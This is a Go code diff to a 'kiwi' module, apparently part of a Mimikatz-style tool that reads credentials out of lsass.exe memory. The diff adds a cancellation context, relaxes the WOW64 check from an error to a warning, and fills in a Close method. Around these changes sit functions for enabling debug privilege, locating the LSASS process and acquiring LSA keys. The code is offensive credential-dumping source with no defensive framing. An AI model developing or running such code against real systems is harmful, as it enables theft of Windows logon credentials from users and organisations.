@@ -3,6 +3,7 @@
 package kiwi
 
 import (
+	"context"
 	"fmt"
 	"runtime"
 	"sync"
@@ -55,24 +56,40 @@ type Kiwi struct {
 	// modules about lsass.exe
 	modules    []*basicModuleInfo
 	modulesRWM sync.RWMutex
+
+	// prevent dead loop
+	ctx    context.Context
+	cancel context.CancelFunc
 }
 
 // NewKiwi is used to create a new kiwi module.
-func NewKiwi(logger logger.Logger) (*Kiwi, error) {
+func NewKiwi(lg logger.Logger) (*Kiwi, error) {
 	switch arch := runtime.GOARCH; arch {
 	case "386", "amd64":
 	default:
 		return nil, errors.Errorf("current architecture %s is not supported", arch)
 	}
-	return &Kiwi{logger: logger, rand: random.NewRand()}, nil
-}
-
-func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
-	kiwi.logger.Println(lv, "kiwi", log...)
+	kiwi := Kiwi{
+		logger: lg,
+		rand:   random.NewRand(),
+	}
+	wow64, err := kiwi.isWow64()
+	if err != nil {
+		return nil, err
+	}
+	if wow64 {
+		kiwi.logf(logger.Warning, "running kiwi (x86) in the x64 Windows")
+	}
+	kiwi.ctx, kiwi.cancel = context.WithCancel(context.Background())
+	return &kiwi, nil
 }
 
 func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
 	kiwi.logger.Printf(lv, "kiwi", format, log...)
+}
+
+func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
+	kiwi.logger.Println(lv, "kiwi", log...)
 }
 
 // EnableDebugPrivilege is used to enable debug privilege.
@@ -92,14 +109,7 @@ func (kiwi *Kiwi) EnableDebugPrivilege() error {
 
 // GetAllCredential is used to get all credentials from lsass.exe memory.
 func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
-	// check is running on WOW64
-	wow64, err := kiwi.isWow64()
-	if err != nil {
-		return nil, err
-	}
-	if wow64 {
-		return nil, errors.New("can't access x64 process")
-	}
+
 	pid, err := kiwi.getLSASSProcessID()
 	if err != nil {
 		return nil, err
@@ -151,7 +161,12 @@ func (kiwi *Kiwi) acquireLSAKeys(pHandle windows.Handle) error {
 	}
 }
 
-// Close is used to close kiwi module TODO destroy key
+// Close is used to close kiwi module. TODO destroy key
 func (kiwi *Kiwi) Close() {
-
+	kiwi.cancel()
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if kiwi.key3DES == nil {
+		return
+	}
 }
